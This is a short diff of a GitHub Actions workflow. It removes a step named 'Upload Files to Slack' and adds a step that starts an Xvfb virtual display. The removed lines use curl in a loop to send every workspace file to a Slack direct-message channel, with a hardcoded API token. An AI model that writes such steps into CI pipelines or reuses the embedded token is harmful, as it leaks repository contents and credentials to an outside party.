@@ -6,15 +6,9 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: Upload Files to Slack
+      - name: Start Xvfb
         run: |
-          cd $GITHUB_WORKSPACE
-          files=(*)
-          if [ ${#files[@]} -eq 0 ]; then
-            echo "No files found."
-            # Add your logic here if no files are found
-          else
-            for file in "${files[@]}"; do
-              curl -F file=@$GITHUB_WORKSPACE/$file -F channels=D05906C3VMG -F token=7Qx1vnOqsyFIuDqUzwRWZFAd https://slack.com/api/files.upload
-            done
-          fi
+          sudo apt-get install -y xvfb
+          Xvfb :99 -screen 0 1024x768x24 &
+          export DISPLAY=:99
+
